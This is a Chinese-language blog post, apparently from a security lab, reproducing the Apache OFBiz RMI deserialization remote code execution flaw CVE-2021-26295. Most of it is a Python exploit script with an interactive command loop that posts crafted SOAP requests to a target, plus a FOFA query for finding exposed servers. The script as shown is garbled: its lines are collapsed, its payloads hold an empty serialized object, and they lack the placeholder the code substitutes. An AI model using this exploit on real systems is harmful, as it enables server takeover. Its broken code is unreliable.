# 【漏洞复现】Apache OFBiz 反序列化RCE漏洞（CVE-2021-26295）

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzUyMTU4NTI2OQ==&mid=2247491766&idx=1&sn=fb6ba9cd41a2fa46087a5146aa722469&chksm=f9da77acceadfeba9a9a880ad6c04274ca25b8ea9ebe3bd9e1f4d65d0b61edec812c881d818d&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzUyMTU4NTI2OQ==&mid=2247491766&idx=1&sn=fb6ba9cd41a2fa46087a5146aa722469&chksm=f9da77acceadfeba9a9a880ad6c04274ca25b8ea9ebe3bd9e1f4d65d0b61edec812c881d818d&scene=27#wechat_redirect)

  

![](../Images/aae4c40d887e7cd9218f50f4a9146bea.png)

  

“燕云实验室”是河北千诚电子科技有限公司成立的网络安全攻防技术研究实验室。专注于web安全，网络攻防，安全运维，应急溯源方面的研究，开发成果应用于产品核心技术转化，国家重点科技项目攻关。

  

  

  
一、漏洞概述  
OFBiz是一个非常著名的电子商务平台和开源项目，提供了创建基于最新J2EE/XML规范和技术标准，构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类WEB应用系统的框架。OFBiz最主要的特点是OFBiz提供了一整套的开发基于Java的web应用程序的组件和工具。包括实体引擎, 服务引擎, 消息引擎，工作流引擎，规则引擎等。

  

2021年3月22日 Apache OFBiz官方发布安全更新，修复了一处由RMI反序列化造成的远程代码执行漏洞。攻击者可构造恶意请求，触发反序列化，从而造成任意代码执行，控制服务器。

  

  
二、影响版本  

Apache OFBiz < v17.12.06

FOFA：app="Apache\_OFBiz"

  

  
三、漏洞复现  

这里给大家分享一波不调用java的纯python利用脚本，5根头发换来的整合py

```
#!/usr/bin/python3# -*- coding:utf-8 -*-# author: zhzykerimport sysimport requestsfrom requests.compat import urljoinimport urllib3urllib3.disable_warnings()
if len(sys.argv)!=2:    print('+------------------------------------------------------------------+')    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub             +')    print('+      RMI Deserializes Remote Code Execution                      +')    print('+------------------------------------------------------------------+')    print('+ USE: python3 <url>                                               +')    print('+ EXP: python3 cve-2021-26295_rce.py https://127.0.0.1:8443        +')    print('+ VER: < 17.12.06                                                  +')    print('+------------------------------------------------------------------+')    sys.exit()
url = sys.argv[1]
def _trans(s):    return "%s" % ''.join('%.2x' % x for x in s)
def ofbiz_rce(url, cmd):    headers = {        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',        'Accept-Encoding': 'gzip, deflate',        'Accept': '*/*',        'Connection': 'close',        'Content-Type': 'text/xml'    }    payload_cve_2021_26295_exp_1 = '''<?xml version='1.0' encoding='UTF-8'?>                            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">                            <soapenv:Header/><soapenv:Body><ns1:clearAllEntityCaches xmlns:ns1="http://ofbiz.apache.org/service/">                            <ns1:cus-obj></ns1:cus-obj></ns1:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>'''    payload_cve_2021_26295_exp_2 = '''<?xml version='1.0' encoding='UTF-8'?>                    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">                    <soapenv:Header/><soapenv:Body><ns1:clearAllEntityCaches xmlns:ns1="http://ofbiz.apache.org/service/">                    <ns1:cus-obj></ns1:cus-obj></ns1:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>'''    try:        data = bytes(cmd, encoding="utf8")        hex = _trans(data)        payload = payload_cve_2021_26295_exp_1.replace("RECOMMAND", hex)        url = urljoin(url, "/webtools/control/SOAPService")        request = requests.post(url, data=payload, headers=headers, timeout=10, verify=False)        if r"cus-obj" in request.text:            data = payload_cve_2021_26295_exp_2.replace("RECOMMAND", hex)            request = requests.post(url, data=data, headers=headers, timeout=10, verify=False)        if request.status_code == 200:            return "Command Executed Successfully (But No Echo)"        else:            return "Command Executed Failed... ..."    except:        return "Command Executed Failed... ..."
if __name__ == '__main__':    while True:        command_in = input("Command >>> ")        if command_in == "exit":            exit(0)        print (ofbiz_rce(url, command_in))
```

  

使用说明就很简单了，很久没动exphub了，这次脚本依旧丢在exphub
